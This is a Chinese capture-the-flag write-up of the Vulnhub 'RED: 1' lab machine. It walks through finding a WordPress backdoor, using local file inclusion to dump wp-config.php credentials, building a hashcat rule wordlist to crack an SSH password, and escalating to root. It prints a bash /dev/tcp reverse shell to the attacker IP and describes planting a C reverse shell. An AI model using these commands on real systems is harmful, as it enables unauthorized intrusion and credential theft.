---
layout: post
title: "【Vulnhub靶场】RED: 1"
date: "2022-03-21T08:53:32.763Z"
---
【Vulnhub靶场】RED: 1
=================

环境准备
====

下载靶机导入到vmware

> 但是获取不到地址，可以根据我博客里的方法修改网卡来获取IP地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/a5bd54cecda346dc9247d3a2a2383da3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)

信息收集
====

我们改好网卡之后，我们使用arp-scan命令来探测靶机的IP地址  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2b74e8495bda452fa83101c235c7ac39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
靶机IP地址为：192.168.2.15  
攻击机IP地址为：192.168.2.17  
我们使用nmap扫描靶机开放的端口信息  
![在这里插入图片描述](https://img-blog.csdnimg.cn/77df06a3c29b4a8dbc0ed719e0b05109.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
只开放了ssh跟80端口，我们首先访问他的网站  
![在这里插入图片描述](https://img-blog.csdnimg.cn/b4d92111b238451aa1443a839d327eff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
发现是一个被黑了的网站，点击search后，会跳到一个域名  
![在这里插入图片描述](https://img-blog.csdnimg.cn/6279a0769fa048998d02b3d04555c592.png)  
我们修改hosts解析  
![在这里插入图片描述](https://img-blog.csdnimg.cn/0acc78429624420abf09194d6e2a6d2c.png)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/5126ba20b1044ac2ba76a75135e310f6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)

渗透开始
====

修改好后，网站可以正常访问了，我们看看有没有什么可以利用的信息  
![在这里插入图片描述](https://img-blog.csdnimg.cn/a43bfd994ace40f599f5eb86db1a348f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/718311271e154c069a0413b4e09ed923.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
查看源码发现有一串英文

> Still Looking For It? Maybe you should ask Mr. Miessler for help, not that it matters, you won't be able to read anything with it anyway  
> 还在找吗?也许你应该找米斯勒先生帮忙，但这并不重要，反正你用它什么也看不懂

叫我们找Mr.Miessler帮忙，我百度了一下，发现是一个seclists工具  
![在这里插入图片描述](https://img-blog.csdnimg.cn/50b9910008404327a89b5cfcf4f75045.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
我们继续寻找一下信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/f570a0432eef4f9794e8537e66ad45e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
发现是有后门的，并且是wordpress搭建的，我们可以尝试用刚刚找到的工具的字典来爆破一下后门

    python3 dirsearch.py  -u "http://redrocks.win" -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/69bbfe28dea84516af9c931d3991e515.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
这应该就是后门了  
![在这里插入图片描述](https://img-blog.csdnimg.cn/794ec544b4764ad7bf50965c63829a44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
可以访问的，但是我们没有参数连接，我们使用wfuzz工具爆破一下，同样用刚刚工具的字典

    wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=ls
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/675b4b82e21541009c0d88a588e2f5f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
爆破出来是key，我们提交一下这个参数，发现是文件包含  
![在这里插入图片描述](https://img-blog.csdnimg.cn/0a3b054335a448cf9c3ef8ec7d4b1d19.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
我们尝试读取一下后门文件的源码，看看他还有没有其他的功能  
![在这里插入图片描述](https://img-blog.csdnimg.cn/280feb1faeeb4df1b1d093fa8f4ba0b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
发现并不行，我们尝试使用本地文件包含协议去读取  
![在这里插入图片描述](https://img-blog.csdnimg.cn/d6fa8c8845fa433ca2c4abc28ebf40cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
成功了，我们把它basr64解码得到

    <?php
       $file = $_GET['key'];
       if(isset($file))
       {
           include("$file");
       }
       else
       {
           include("NetworkFileManagerPHP.php");
       }
       /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */
    ?>
    

并没有别的功能，但是有一串base64编码的东西，我们把它解码得到

> That password alone won't help you! Hashcat says rules are rules  
> 这个密码并不能帮助您!Hashcat说规则就是规则

暂时用不上，先记着  
我们之前发现这个网站是wordpress搭建的，我们查看一下wp-config.php这个文件，应该是会有mysql连接的信息的  
![在这里插入图片描述](https://img-blog.csdnimg.cn/af5bda5bb2c5429eab7798f2019fb230.png)  
base64解码得到

    /**
    * The base configuration for WordPress
    *
    * The wp-config.php creation script uses this file during the installation.
    * You don't have to use the web site, you can copy this file to "wp-config.php"
    * and fill in the values.
    *
    * This file contains the following configurations:
    *
    * * MySQL settings
    * * Secret keys
    * * Database table prefix
    * * ABSPATH
    *
    * @link https://wordpress.org/support/article/editing-wp-config-php/
    *
    * @package WordPress
    */
    // ** MySQL settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );
    
    /** MySQL database username */
    define( 'DB_USER', 'john' );
    
    /** MySQL database password */
    define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );
    
    /** MySQL hostname */
    define( 'DB_HOST', 'localhost' );
    
    /** Database Charset to use in creating database tables. */
    define( 'DB_CHARSET', 'utf8' );
    
    /** The Database Collate type. Don't change this if in doubt. */
    define( 'DB_COLLATE', '' );
    
    define('FS_METHOD', 'direct');
    
    define('WP_SITEURL', 'http://redrocks.win');
    define('WP_HOME', 'http://redrocks.win');
    
    /**#@+
    * Authentication unique keys and salts.
    *
    * Change these to different unique phrases! You can generate these using
    * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
    *
    * You can change these at any point in time to invalidate all existing cookies.
    * This will force all users to have to log in again.
    *
    * @since 2.6.0
    */
    define('AUTH_KEY', '2uuBvc8SO5{>UwQ<^5V5[UHBw%N}-BwWqw|><*HfBwJ( $&%,(Zbg/jwFkRHf~v|');
    define('SECURE_AUTH_KEY', 'ah}define('LOGGED_IN_KEY', '[a!K}D<7-vB3Y&x_<3e]Wd+J]!o+A:U@QUZ-RU1]tO@/N}b}R@+/$+u*pJ|Z(xu-');
    define('NONCE_KEY', ' g4|@~:h,K29D}$FL-f/eujw(VT;8wa7xRWpVR: >},]!Ez.48E:ok 8Ip~5_o+a');
    define('AUTH_SALT', 'a;,O<~vbpL+|@W+!Rs1o,T$r9(LwaXI =I7ZW$.Z[+BQ=B6QG7nr+w_bQ6B]5q4c');
    define('SECURE_AUTH_SALT', 'GkU:% Lo} 9}w38i:%]=uq&J6Z&RR#v2vsB5a_ +.[us;6mE+|$x*+ D*Ke+:Nt:');
    define('LOGGED_IN_SALT', '#`F9&pm_jY}N3y0&8Z]EeL)z,$39,yFc$Nq`jGOMT_aM*`<$9A:9define('NONCE_SALT', 'hTlFE*6zlZMbqluz)hf:-:x-:l89fC4otci;38|i`7eU1;+k[!0[ZG.oCt2@-y3X');
    
    /**#@-*/
    
    /**
    * WordPress database table prefix.
    *
    * You can have multiple installations in one database if you give each
    * a unique prefix. Only numbers, letters, and underscores please!
    */
    $table_prefix = 'wp_';
    
    /**
    * For developers: WordPress debugging mode.
    *
    * Change this to true to enable the display of notices during development.
    * It is strongly recommended that plugin and theme developers use WP_DEBUG
    * in their development environments.
    *
    * For information on other constants that can be used for debugging,
    * visit the documentation.
    *
    * @link https://wordpress.org/support/article/debugging-in-wordpress/
    */
    define( 'WP_DEBUG', false );
    
    /* Add any custom values between this line and the "stop editing" line. */
    
    
    
    /* That's all, stop editing! Happy publishing. */
    
    /** Absolute path to the WordPress directory. */
    if ( ! defined( 'ABSPATH' ) ) {
    define( 'ABSPATH', __DIR__ . '/' );
    }
    
    /** Sets up WordPress vars and included files. */
    require_once ABSPATH . 'wp-settings.php';
    

有一个叫john的用户，我们之前查看/etc/passwd的文件时看到了john这个用户是可以登录的  
我们尝试用这个密码登录  
![在这里插入图片描述](https://img-blog.csdnimg.cn/bee61f526d634d7192ace97f52fcfa8f.png)  
但是密码错误了，我们突然想到之前的提示

> That password alone won't help you! Hashcat says rules are rules  
> 这个密码并不能帮助您!Hashcat说规则就是规则

应该是要用hashcat的规则去生成一个密码本，然后爆破密码登录

    hashcat --stdout passwd -r /usr/share/hashcat/rules/best64.rule > pass2
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/e2f7e0b9e0d9472cbdbc3162003f564b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
成功爆破出密码，我们使用这个密码登录

提权
==

![在这里插入图片描述](https://img-blog.csdnimg.cn/6e42816437804023b1efb08b31abd93a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
发现我们可以不用密码使用ippsec用户运行time命令，我们使用time命令提权  
![在这里插入图片描述](https://img-blog.csdnimg.cn/c65013ca894d48fa89c0bcb6c9028405.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
成功提权  
![在这里插入图片描述](https://img-blog.csdnimg.cn/8e73f0ef2ca44c16b20306ed4c44212b.png)  
我们查找一下有用的信息  
正在查找的时候，突然被断开了  
![在这里插入图片描述](https://img-blog.csdnimg.cn/f53d1221445247a4b9ef7c188193b8ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_12,color_FFFFFF,t_70,g_se,x_16)  
再使用之前爆破出来的密码已经不能用了，只能重新爆破  
![在这里插入图片描述](https://img-blog.csdnimg.cn/413ce75297494717b0747c137a93ae11.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
会自动修改密码，我们去反弹一个shell，让他就算修改了密码也不会被T出会话，先在攻击监听一下9001端口  
然后去靶机连接

    bash -c "bash -i >& /dev/tcp/192.168.2.17/9001 0>&1"
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/b599d354ac394926a1fa908be3ce4d04.png)  
成功连接，然后我们运行如下命令来获得一个完全的shell

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm #这里按下Ctrl+z返回一下
    stty raw -echo;fg #输入reset
    stty rows 46 columns 188
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/640d27e157974a2eaa6b7f17093f0a32.png)  
这样就获得了一个完全的shell，我们继续查看一下信息  
![在这里插入图片描述](https://img-blog.csdnimg.cn/4ed5736788fd43e58bf20c59f8213160.png)  
发现vi命令跟cat命令的功能互换了，但对我们没有什么影响，我们继续查看信息  
![在这里插入图片描述](https://img-blog.csdnimg.cn/53db21c574ef4d41b9427ee74cf3ec5a.png)  
发现了一个假的flag

> Come on now Blue! You really think it would be that easy to get the user flag? You are not even on the right user! Hahaha  
> 来吧，蓝色!你真觉得能轻易拿到flag吗?您甚至没有使用正确的用户!哈哈哈

接下来我就没有什么思路了，去查看了大佬们的博客，发现可以使用pspy64s工具去监听系统运行的程序  
我们进入/tmp目录把它上传到靶机上，赋予运行权限，然后监听一下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/a81c93764ba5438792e5444f7b695c3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/4252cc759b2e4c8ab12c376c4460e46b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
这里有运行好几个程序，并且都是root权限运行的，我们去查看一下那个C程序  
![在这里插入图片描述](https://img-blog.csdnimg.cn/35a231764a194e4287f60eaa6e22f43f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
发现就是把我们T出去的那个文件，我们修改一个程序的源码，让他反弹一个shell  
我们去[这里](https://www.revshells.com/)生成一个C语言的反弹shell的源码  
![在这里插入图片描述](https://img-blog.csdnimg.cn/ce678c155ac84fa0a039fec553b6a3e7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
我们把它删除，然后从攻击机上传C程序到靶机上，**因为我们是没有权限编辑这个文件的**  
![在这里插入图片描述](https://img-blog.csdnimg.cn/9788be9850ed42e994cef8f3190f7d66.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_20,color_FFFFFF,t_70,g_se,x_16)  
上传成功，我们攻击机监听一下9002端口，等待连接，就可以得到root权限了  
![在这里插入图片描述](https://img-blog.csdnimg.cn/aab3352f1db04572872eebdc5f6aae5c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU3RhcnJ5YFF1YW4=,size_17,color_FFFFFF,t_70,g_se,x_16)  
查看root.txt文件即可得到flag  
![在这里插入图片描述](https://img-blog.csdnimg.cn/7bb382489f5f4041a01579196fc3729b.png)  
红色说：GG Blue, GG  
还挺好笑的hhhhh  
还有一个用户的flag，在oxdf用户下  
![在这里插入图片描述](https://img-blog.csdnimg.cn/23f8bd018e7849b98c040d85c841b918.png)  
实验到此结束，学到了新东西，很开心